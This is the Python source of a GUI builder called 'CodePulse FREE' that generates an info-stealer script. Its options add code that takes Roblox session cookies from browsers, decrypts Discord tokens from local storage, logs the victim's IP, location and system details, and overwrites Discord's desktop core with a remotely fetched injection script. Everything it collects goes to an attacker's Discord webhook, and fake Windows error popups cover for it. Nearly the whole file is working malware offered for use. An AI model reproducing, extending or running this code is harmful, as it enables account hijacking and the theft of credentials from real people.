import tkinter as tk
from tkinter import Tk
import customtkinter
from tkinter import ttk
from tkinter import BooleanVar
from tkinter import *
from ttkthemes import ThemedStyle
from tkinter import messagebox
import webbrowser
import os
import base64

root = Tk()
root.title("CodePulse FREE")
root.configure(bg="#292929")  

#################################################################<DONT TOUCH ANYTHING UNLESS YOU KNOW WHAT YOU ARE DOING! OR THIS MIGHT NOT WORK..>#################################################################

roblox_cookie_var = BooleanVar()
ip_logging_var = BooleanVar()
get_os_info_var = BooleanVar()
inject_discord_var = BooleanVar()
GetToken = BooleanVar()
FakeError = BooleanVar()
StartUp = BooleanVar()


def generate_code():
    webhook_url = webhook_entry.get()
    code = '''import browser_cookie3
import datetime
import base64
import requests
import json
import platform
import psutil
import shutil
import subprocess
import sys
import getpass
import os
import socket
import GPUtil
import re
import random
import ctypes
from pathlib import Path
from re import findall
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData


webhook_url = '{}'

'''.format(webhook_url)
#################################################################<GET Roblox Cookie>#################################################################

    if roblox_cookie_var.get():
        code += '''\
def get_roblox_cookie():
    cookies = {}
    browsers = [('Chrome', browser_cookie3.chrome), ('Edge', browser_cookie3.edge), ('Firefox', browser_cookie3.firefox), ('Safari', browser_cookie3.safari), ('Opera', browser_cookie3.opera), ('Brave', browser_cookie3.brave), ('Vivaldi', browser_cookie3.vivaldi)]
    for browser_name, browser in browsers:
        try:
            browser_cookies = browser(domain_name='roblox.com')
            for cookie in browser_cookies:
                if cookie.name == '.ROBLOSECURITY':
                    cookies[browser_name] = cookie.value
        except:
            pass
    return cookies

def get_user_info(cookie):
    url = 'https://www.roblox.com/mobileapi/userinfo'
    headers = {
        'User-Agent': 'Roblox/WinInet',
        'Cookie': f'.ROBLOSECURITY={cookie}'
    }
    response = requests.get(url, headers=headers)
    return response.json()

cookies = get_roblox_cookie()
if cookies:
    for browser_name, cookie_value in cookies.items():
        user_info = get_user_info(cookie_value)
        username = user_info.get('UserName', 'Unknown')
        is_premium = user_info.get('IsPremium', False)
        user_id = user_info.get('UserID', 'Unknown')
        robux_balance = user_info.get('RobuxBalance', 0)
        thumbnail_url = user_info.get('ThumbnailUrl', '')
        cookie = cookie_value
        payload = {
            'username': 'CookieBypasser',
            'embeds': [
                {
                    'title': f'New .ROBLOSECURITY cookie found in {browser_name} browser',
                    'description': f'**Username:** {username} | **Is Premium:** {is_premium} | **ID:** {user_id} | **Robux Balance:** {robux_balance} | **Cookie:** {cookie}',
                    'color': 7506394,
                    'thumbnail': {
                        'url': thumbnail_url
                    }
                }
            ]
        }
        headers = {
            'Content-Type': 'application/json'
        }
        response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
        # Check if the response was successful
        if response.status_code == 204:
            print(f'Loading...')
else:
    print("Please Wait...")
'''
#################################################################<GET IP INFO>#################################################################

    if ip_logging_var.get():
        code += '''
response = requests.get("http://ipinfo.io/json")
data = response.json()

fields = [
    {"name": "IP Address", "value": data["ip"], "inline": False},
    {"name": "City", "value": data["city"], "inline": True},
    {"name": "Region", "value": data["region"], "inline": True},
    {"name": "Country", "value": data["country"], "inline": True},
    {"name": "Location", "value": f"{data['loc']}, {data['postal']}", "inline": False},
    {"name": "Timezone", "value": data["timezone"], "inline": True},
    {"name": "Organization", "value": data["org"], "inline": False},
]

embed = {
    "title": "IP Address Lookup",
    "color": 3447003,
    "fields": fields
}

requests.post(webhook_url, json={"embeds": [embed]})
'''
#################################################################<GET OS INFO>#################################################################

    if get_os_info_var.get():
        code += '''
os_name = platform.system()
os_version = platform.release()
os_info = f"{os_name} {os_version}"

cpu_info = platform.processor()

ram_info = f"{psutil.virtual_memory().total / (1024 ** 3):.2f}"
ram_usage = f"{psutil.virtual_memory().percent}%"

disk_info = psutil.disk_usage(os.path.abspath(os.sep))
disk_info_str = f"{disk_info.total / (1024 ** 3):.2f} GB"

gpu_info = ""
try:
    gpu_list = GPUtil.getGPUs()
    if gpu_list:
        gpu_info = f"{gpu_list[0].name} ({gpu_list[0].load*100:.1f}%)"
except ImportError:
    pass

desktop_info = ""
if os.name == "posix":
    desktop_info = "N/A"
elif os.name == "nt":
    from winreg import HKEY_CURRENT_USER, ConnectRegistry, OpenKey, QueryValueEx

    key = OpenKey(ConnectRegistry(None, HKEY_CURRENT_USER), r"Control Panel\Desktop")
    desktop_info = QueryValueEx(key, "Wallpaper")[0]

embed = {
    "title": "PC Information - CodePulse Stealer",
    "color": 3447704,
    "fields": [
        {"name": "OS", "value": f"```{os_info}```", "inline": False},
        {"name": "CPU", "value": f"```{cpu_info}```", "inline": False},
        {"name": "RAM", "value": f"```{ram_info} GB```", "inline": True},
        {"name": "RAM Usage", "value": f"```{ram_usage}```", "inline": True},
        {"name": "Storage", "value": f"```{disk_info_str}```", "inline": True},
        {"name": "GPU", "value": f"```{gpu_info}```", "inline": False},
        {"name": "Desktop", "value": f"```{desktop_info}```", "inline": False}
    ]
}

response = requests.post(webhook_url, json={"embeds": [embed]})

if response.status_code != 204:
    print(f"Loading...")
'''
#################################################################<Inject Discord https://github.com/syntheticlol a bit rewrited>#################################################################

    if inject_discord_var.get():
        code +=  '''
local_app_data = os.getenv('localappdata')

def inject_discord():
    for directory in os.listdir(local_app_data):
        if 'discord' in directory.lower():
            for subdirectory in os.listdir(os.path.join(local_app_data, directory)):
                if re.match(r'app-(\d*\.\d*)*', subdirectory):
                    directory_path = os.path.join(local_app_data, directory, subdirectory)
                    injection_script = requests.get("https://raw.githubusercontent.com/lnfernal/Discord-Injection/main/Injection-clean.js").text.replace("%WEBHOOK%", webhook_url)
                    
                    try:
                        index_file_path = os.path.join(directory_path, 'modules', 'discord_desktop_core-1', 'discord_desktop_core', 'index.js')
                        with open(index_file_path, 'w', encoding="utf-8") as index_file:
                            index_file.write(injection_script)
                        print("Wait...")
                        return True
                    except:
                        pass
    
    print("Failed to load. Please try again later.")
    return False

def kill_discord():
    for process in psutil.process_iter():
        if process.name() == "Discord.exe":
            process.kill()

embed = {
    "title": "Discord Injection - CodePulse Stealer",
    "color": 3447704,
    "fields": []
}

injection_successful = inject_discord()

if injection_successful:
    embed["fields"].append({"name": "Injection Status", "value": "Discord injection completed successfully.", "inline": False})
else:
    embed["fields"].append({"name": "Injection Status", "value": "Discord injection failed.", "inline": False})

response = requests.post(webhook_url, json={"embeds": [embed]})


kill_discord() 
'''



#################################################################<Get Token https://github.com/Decks-Team/Cyanide-Stealer a bit rewrited>#################################################################

    if GetToken.get():
        code += '''\

class extract_tokens:
    def __init__(self) -> None:
        self.base_url = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.regexp_enc = r"dQw4w9WgXcQ:[^\\"]*"

        self.tokens, self.uids = [], []

        self.extract()

    def extract(self) -> None:
        paths = {
        'Discord': self.roaming + '\\\\discord\\\\Local Storage\\\\leveldb\\\\',
        'Discord Canary': self.roaming + '\\\\discordcanary\\\\Local Storage\\\\leveldb\\\\',
        'Lightcord': self.roaming + '\\\\Lightcord\\\\Local Storage\\\\leveldb\\\\',
        'Discord PTB': self.roaming + '\\\\discordptb\\\\Local Storage\\\\leveldb\\\\',
        'Opera': self.roaming + '\\\\Opera Software\\\\Opera Stable\\\\Local Storage\\\\leveldb\\\\',
        'Opera GX': self.roaming + '\\\\Opera Software\\\\Opera GX Stable\\\\Local Storage\\\\leveldb\\\\',
        'Amigo': self.appdata + '\\\\Amigo\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
        'Torch': self.appdata + '\\\\Torch\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
        'Kometa': self.appdata + '\\\\Kometa\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
        'Orbitum': self.appdata + '\\\\Orbitum\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
        'CentBrowser': self.appdata + '\\\\CentBrowser\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
        '7Star': self.appdata + '\\\\7Star\\\\7Star\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
        'Sputnik': self.appdata + '\\\\Sputnik\\\\Sputnik\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
        'Vivaldi': self.appdata + '\\\\Vivaldi\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',
        'Chrome SxS': self.appdata + '\\\\Google\\\\Chrome SxS\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
        'Chrome': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',
        'Chrome1': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 1\\\\Local Storage\\\\leveldb\\\\',
        'Chrome2': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 2\\\\Local Storage\\\\leveldb\\\\',
        'Chrome3': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 3\\\\Local Storage\\\\leveldb\\\\',
        'Chrome4': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 4\\\\Local Storage\\\\leveldb\\\\',
        'Chrome5': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 5\\\\Local Storage\\\\leveldb\\\\',
        'Epic Privacy Browser': self.appdata + '\\\\Epic Privacy Browser\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
        'Microsoft Edge': self.appdata + '\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',
        'Uran': self.appdata + '\\\\uCozMedia\\\\Uran\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',
        'Yandex': self.appdata + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',
        'Brave': self.appdata + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',
        'Iridium': self.appdata + '\\\\Iridium\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\'
    }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            _discord = name.replace(" ", "").lower()
            if "cord" in path:
                if not os.path.exists(self.roaming+f'\\{_discord}\\Local State'):
                    continue
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for y in re.findall(self.regexp_enc, line):
                            token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+f'\\{_discord}\\Local State'))
                            
                            if self.validate_token(token):
                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)

            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regexp, line):
                            if self.validate_token(token):
                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)

        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regexp, line):
                            if self.validate_token(token):
                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)

    def validate_token(self, token: str) -> bool:
        r = requests.get(self.base_url, headers={'Authorization': token})

        if r.status_code == 200:
            return True

        return False
    
    def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()

        return decrypted_pass

    def get_master_key(self, path: str) -> str:
        if not os.path.exists(path):
            return

        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
            return

        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]

        return master_key
    
    def print_tokens(self, webhook_url):
        if len(self.tokens) == 0:
            embed = {
                "title": "Token Information",
                "description": "No tokens found. :negative_squared_cross_mark:",
                "color": 16711680  # Red color (you can customize the color value)
            }
            payload = {
                "embeds": [embed]
            }
            response = requests.post(webhook_url, json=payload)
        else:
            embeds = []
            for token in self.tokens:
                embed = {
                "title": ":sparkles: Token Information",
                "description": token,
                "color": 16729344,    # Red color (you can customize the color value)
                "footer": {
                "text": f"Execution completed at {datetime.datetime.now()}",
    }
}
                embeds.append(embed)
                payload = {
                    "embeds": embeds
                }
                response = requests.post(webhook_url, json=payload)


# Usage
extractor = extract_tokens()
extractor.print_tokens(webhook_url)

'''

#################################################################<Fake Error>#################################################################


    if FakeError.get():
        code += '''\
MB_ICON_ERROR = 0x10
MB_ICON_QUESTION = 0x20
MB_ICON_WARNING = 0x30

MB_OK = 0x0
MB_OKCANCEL = 0x1
MB_YESNO = 0x4

IDOK = 1
IDCANCEL = 2
IDYES = 6
IDNO = 7

error_codes = [
    "0x00000001",
    "0x00000002",
    "0x00000003",
    "0x00000004",
    "0x00000005"
]

error_messages = [
    "A required DLL file was not found",
    "The system cannot find the file specified",
    "Access is denied",
    "The system cannot start the specified program",
    "Insufficient system resources exist to complete the requested service"
]

error_code = random.choice(error_codes)
error_message = random.choice(error_messages)

MessageBox = ctypes.windll.user32.MessageBoxW
MessageBox(None, error_message, f"Windows Error {error_code}", MB_ICON_ERROR | MB_YESNO)
        '''




#################################################################<SAVE THE CODE (CHOICES)>#################################################################



    current_directory = os.path.dirname(os.path.abspath(__file__))
    filepath = os.path.join(current_directory, 'generated_code.py')
    with open(filepath, 'w') as file:
        file.write(code)

    print("Generated code has been written to 'generated_code.py' file.")


#################################################################<Delete foreign files in startup folder BUTTON>#################################################################



def delete_foreign_files():
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    success = 0
    error = 0
    deleted_files = []

    for root, _, files in os.walk(startup_folder):
        for file in files:
            if file.endswith(('.txt', '.bat', '.py')):
                file_path = os.path.join(root, file)
                if file_path != os.path.abspath(__file__):
                    try:
                        os.remove(file_path)
                        success += 1
                        deleted_files.append(file)
                        print('Deleted:', file)
                    except:
                        error += 1

    if success == 0:
        messagebox.showinfo('Nevermind', 'You have nothing on startup D:, ig your clean!!')
    else:
        messagebox.showinfo('Deletion Successful', f'{success} files deleted successfully:\n{", ".join(deleted_files)}')

    if error > 0:
        messagebox.showinfo('Deletion Errors', f'{error} errors occurred while deleting files.')



#################################################################<REPLACE DISCORD DEKSTOP CORE INDEX.JS BUTTON>#################################################################




def replace_index_js():
    discord_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Discord')
    version = None

    for folder in os.listdir(discord_path):
        if folder.startswith('app-'):
            version = folder.split('-')[-1]
            break

    if version:
        index_path = os.path.join(discord_path, f'app-{version}', 'modules', 'discord_desktop_core-1',
                                  'discord_desktop_core', 'index.js')
        file_size = os.path.getsize(index_path)

        if file_size > 1024:
            messagebox.showinfo('File Size Check', f'Index.js file size is {file_size} bytes, which is larger than 1024 / 1kb bytes.')
            new_text = 'module.exports = require(\'./core.asar\');'
            with open(index_path, 'w') as file:
                file.write(new_text)
                messagebox.showinfo('File Replacement', 'Index.js file replaced successfully.')
        else:
            messagebox.showinfo('File Size Check', f'Index.js file size is {file_size} bytes, which is less than or equal to 1024 bytes.')


#################################################################<OPEN DISCORD INV BUTTON>#################################################################

def open_discord_invite():
    discord_invite_base64 = b'aHR0cHM6Ly9kaXNjb3JkLmdnL20yUm5xZXhjZEQ='
    discord_invite_link = base64.b64decode(discord_invite_base64).decode('utf-8')
    webbrowser.open(discord_invite_link)

#################################################################<STYLE>#################################################################

style = ThemedStyle(root)
style.theme_use('equilux')

style.configure("TNotebook", background="#292929")
style.map("TNotebook.Tab", background=[("selected", "#292929")], foreground=[("selected", "White")])

notebook = ttk.Notebook(root)
notebook.pack(fill=tk.BOTH, expand=True)

#################################################################<FIRST TAB>#################################################################

tab1 = ttk.Frame(notebook)
notebook.add(tab1, text='Main')


roblox_cookie_checkbox = customtkinter.CTkCheckBox(tab1, text='Get Roblox Cookie', variable=roblox_cookie_var)
roblox_cookie_checkbox.pack(pady=(0, 5), fill='x')

ip_logging_checkbox = customtkinter.CTkCheckBox(tab1, text='Enable IP Logging', variable=ip_logging_var)
ip_logging_checkbox.pack(pady=(0, 5), fill='x')

get_os_info_checkbox = customtkinter.CTkCheckBox(tab1, text='Get OS Info', variable=get_os_info_var)
get_os_info_checkbox.pack(pady=(0, 5), fill='x')


GetToken = customtkinter.CTkCheckBox(tab1, text='Get Discord Token', variable=GetToken)
GetToken.pack(pady=(0, 5), fill='x')


inject_discord_checkbox = customtkinter.CTkCheckBox(tab1, text='Inject Discord', variable=inject_discord_var)
inject_discord_checkbox.pack(pady=(0, 5), fill='x')

FakeError = customtkinter.CTkCheckBox(tab1, text='Fake Error', variable=FakeError)
FakeError.pack(pady=(0, 5), fill='x')


webhook_label = customtkinter.CTkLabel(tab1, text="Webhook URL:")
webhook_label.pack(pady=(0, 5), fill='x')

webhook_entry = customtkinter.CTkEntry(tab1, placeholder_text="Enter your webhook")
webhook_entry.pack(pady=(0, 5), fill='x')


generate_button = customtkinter.CTkButton(tab1, text='Generate Code', command=generate_code)
generate_button.pack(pady=(0, 5), fill='x')
generate_button.bind("<Enter>")
generate_button.bind("<Leave>")

#################################################################<SECOND TAB>#################################################################
tab2 = ttk.Frame(notebook)
notebook.add(tab2, text='Extra')
notebook.pack(fill=tk.BOTH, expand=True)




joindiscord = customtkinter.CTkButton(tab2, text="Join Discord", command=open_discord_invite)
joindiscord.pack(pady=(0, 5), fill='x')


start_button = customtkinter.CTkButton(tab2, text='Delete foreign files from startup', command=delete_foreign_files)
start_button.pack(pady=(0, 5), fill='x')

replace_button = customtkinter.CTkButton(tab2, text='Replace discord desktop core INDEX.JS', command=replace_index_js)
replace_button.pack(pady=(0, 5), fill='x')




root.mainloop()
